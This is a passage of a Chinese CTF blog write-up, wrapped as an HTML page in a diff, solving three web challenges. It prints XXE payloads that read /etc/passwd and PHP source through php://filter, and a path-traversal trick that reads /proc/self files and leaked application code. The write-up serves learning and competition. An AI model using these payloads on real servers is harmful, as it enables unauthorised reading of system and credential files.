@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48x48-next.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48x48-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x01 Game这题迷得很，查看下一下js，按着ajax发送请求得条件自己发一个请求就好了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中关村第三届新兴领域专题赛网络与信息安全领域专项赛Web_WP">
+<meta property="og:url" content="http://yoursite.com/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/index.html">
+<meta property="og:site_name" content="Cyc1e&#39;s Blog">
+<meta property="og:description" content="0x01 Game这题迷得很，查看下一下js，按着ajax发送请求得条件自己发一个请求就好了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/8418106-e70774e2e39d1c0a.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/8418106-2fda3cd70b9dfd2a.png">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8418106-f4164106f9873a89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="article:published_time" content="2019-08-15T12:33:04.000Z">
+<meta property="article:modified_time" content="2020-03-04T10:23:23.688Z">
+<meta property="article:author" content="Cyc1e">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="XXE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/8418106-e70774e2e39d1c0a.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>中关村第三届新兴领域专题赛网络与信息安全领域专项赛Web_WP | Cyc1e's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Cyc1e's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cyc1e's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="Cyc1e">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cyc1e's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          中关村第三届新兴领域专题赛网络与信息安全领域专项赛Web_WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-15 20:33:04" itemprop="dateCreated datePublished" datetime="2019-08-15T20:33:04+08:00">2019-08-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-04 18:23:23" itemprop="dateModified" datetime="2020-03-04T18:23:23+08:00">2020-03-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="index"><span itemprop="name">Cyc1e的CTF之路</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="0x01-Game"><a href="#0x01-Game" class="headerlink" title="0x01 Game"></a>0x01 Game</h3><p>这题迷得很，查看下一下js，按着ajax发送请求得条件自己发一个请求就好了</p>
+<p><img src="/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/8418106-e70774e2e39d1c0a.png" alt></p>
+<p>payload:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/socre.php</span><br><span class="line">POST:<span class="attribute">score</span>=15</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-who-are-you"><a href="#0x02-who-are-you" class="headerlink" title="0x02 who_are_you"></a>0x02 who_are_you</h3><p>XXE的题目，没有任何限制，直接任意文件读取……</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以读到passwd的信息，所以主要就是找到flag就好了，最后是在index.php里找到了flag，由于php文件里有&lt;等特殊字符，所以利用file协议读的时候会出现解析错误导致没有回显，所以换一个编码的协议读就好了比如php://filter</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/convert.base64-encode/resource=index.php"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>index.php源码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">libxml_disable_entity_loader(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">$data = @file_get_contents(<span class="string">'php://input'</span>);</span></span><br><span class="line"><span class="php">$resp = <span class="string">''</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//$flag='flag&#123;1900cb98-96c4-45ac-a22e-86da06d59a3e&#125;';</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span></span><br><span class="line"><span class="php">    $dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span></span><br><span class="line"><span class="php">    ob_start();</span></span><br><span class="line"><span class="php">    $res  = $dom-&gt;textContent;</span></span><br><span class="line"><span class="php">    $resp = ob_get_contents();</span></span><br><span class="line"><span class="php">    ob_end_clean();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($res)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>($res);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>welcome<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"./style.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"contactBody"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>请输入姓名<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"name entry "</span> <span class="attr">id</span>=<span class="string">"name"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">placeholder</span>=<span class="string">"Your Name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"submit entry"</span> <span class="attr">onclick</span>=<span class="string">"func()"</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"shadow"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">play</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// document.getElementById().value</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xml = <span class="string">''</span> +</span></span><br><span class="line"><span class="handlebars"><span class="xml">            '<span class="tag">&lt;<span class="name">\?xml</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">encoding</span>=<span class="string">"UTF-8"</span>\?&gt;</span>' +</span></span></span><br><span class="line"><span class="actionscript">            <span class="string">'&lt;feedback&gt;'</span> +</span></span><br><span class="line"><span class="javascript">            <span class="string">'&lt;author&gt;'</span> + <span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span></span><br><span class="line"><span class="actionscript">            <span class="string">'&lt;/feedback&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(xml);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line">            if (xmlhttp.readyState == 4) &#123;</span><br><span class="line"><span class="actionscript">                <span class="comment">// console.log(xmlhttp.readyState);</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// console.log(xmlhttp.responseText);</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> res = xmlhttp.responseText;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).textContent = res</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="actionscript">        xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="literal">true</span>);</span></span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-show-me-your-image"><a href="#0x03-show-me-your-image" class="headerlink" title="0x03 show_me_your_image"></a>0x03 show_me_your_image</h3><p>主要思路就是上传文件，上传文件后。文件名会被编码，多测几次就可以发现是一个变表的base64编码，base64编码是固定3个字符编码为固定的4个字符，题目的还有一个点就是任意文件读取，name参数后跟任意文件的变表编码的值，所以根据上传的文件名进获取对应的编码，所以上传的文件名需要构造，文件名的长度需要是3的倍数才能确定最后的文件名，并且随便输入的报错信息不是apache+php的，最后才确定是一个Flask模拟的php，骗人用的<del>~</del></p>
+<p>所以现在讲下具体操作步骤：</p>
+<ul>
+<li>设置要读的文件（比如要读的是passwd文件）,设置上传的文件名为’../.././/etc/passwd’（测试可以发现是2层目录，长度要是3的倍数）</li>
+<li>分段进行上传，收集各段的编码后的字符进行拼接，比如axb8axb8axnVSml8jmNBjUS9</li>
+<li>访问img.php?name=[文件编码后的编码]就可以读取到相应的文件</li>
+</ul>
+<p><img src="/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/8418106-2fda3cd70b9dfd2a.png" alt></p>
+<p>所以接下来就是找flag的路径，由于我们不知道各个文件的路径，所以用/proc/self/来仅需读取</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..<span class="regexp">/../</span>.<span class="regexp">/./</span>proc<span class="regexp">/self/</span>cmdline   <span class="comment">#可以读到当前服务为app.py</span></span><br><span class="line"><span class="comment">#python3 app.py sleep 36000</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">../..<span class="comment">//proc/self/cwd/app.py  #可以读到本题的源码</span></span><br><span class="line">#####################################</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> r_encode, r_decode, read_file</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, request</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/tmp/uploads/'</span></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>&#125;</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return <span class="string">'.'</span> <span class="keyword">in</span> filename and \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> 